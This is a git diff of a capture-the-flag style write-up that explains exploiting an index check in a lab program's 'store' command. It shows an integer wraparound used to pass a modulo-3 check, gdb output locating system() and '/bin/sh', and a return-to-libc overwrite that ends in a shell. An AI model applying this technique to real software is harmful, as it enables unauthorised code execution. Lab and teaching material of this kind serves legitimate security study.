@@ -5,15 +5,16 @@
 we found the first element store in the index 1 * 4 so the first element store in 0xFFFFD544 we calculate the offset between the return address and the value we store we found it is 456 that's mean that we must overwrite the return address in the index 114.
 
 when we try use this number we got
-
+```
  Index: 114
  *** ERROR! ***
    This index is reserved for wil!
  *** ERROR! ***
  Failed to do store command
+```
 
 when we check the assembly we found this :
-
+```
    0x08048671 <+65>:    mov    edx,0xaaaaaaab // a Magic number
    0x08048676 <+70>:    mov    eax,ecx
    0x08048678 <+72>:    mul    edx
@@ -24,7 +25,7 @@ when we check the assembly we found this :
    0x08048682 <+82>:    mov    edx,ecx
    0x08048684 <+84>:    sub    edx,eax
    0x08048686 <+86>:    test   edx,edx
-
+```
 in those steps they checked if our number is divided by 3 or not index % 3 === 0
 
 but why we have a division and its represnt it as a multiplication by 0xaaaaaab ??
@@ -53,10 +54,8 @@ This equality looks promising, because we've hammered our expression into the sh
 .
 Every divisor has a magic number, and most have more than one! A magic number for d is nothing more than a precomputed quotient: a power of 2 divided by d and then rounded up. At runtime, we do the same thing, except backwards: multiply by this magic number and then divide by the power of 2, rounding down. The tricky part is finding a power big enough that the "rounding up" part doesn't hurt anything. If we are lucky, a multiple of d will happen to be only slightly larger than a power of 2, so rounding up doesn't change much and our magic number will fit in 32 bits. If we are unlucky, well, we can always fall back to a 33 bit number, which is almost as efficient.
 
-click here to know more
-
 we use the same way that we use in the rainfall project so we know they shift left by 2 << 2
-
+```
     10 00 00 00 00 00 00 00 00 00 00 00 01 11 00 10 << 2
 
     10 00 00 00 00 00 00 00 00 00 00 00 01 11 00 10   <---- 2147483762
@@ -65,9 +64,13 @@ we use the same way that we use in the rainfall project so we know they shift le
 we remove this                              we add 00 here
 
 result is  : 00 00 00 00 00 00 00 00 00 00 00 01 11 00 10 00  = 456
+```
 
+##  Final Exploit
 we gona fill this field by the system address and we keep the next and we change the address 116 to address '/bin/sh' (return to libc)
 
+
+```BASH
 (gdb) p &system
 $2 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
 (gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
@@ -85,3 +88,4 @@ Input command: store
  Completed store command successfully
 Input command: quit
 $
+```
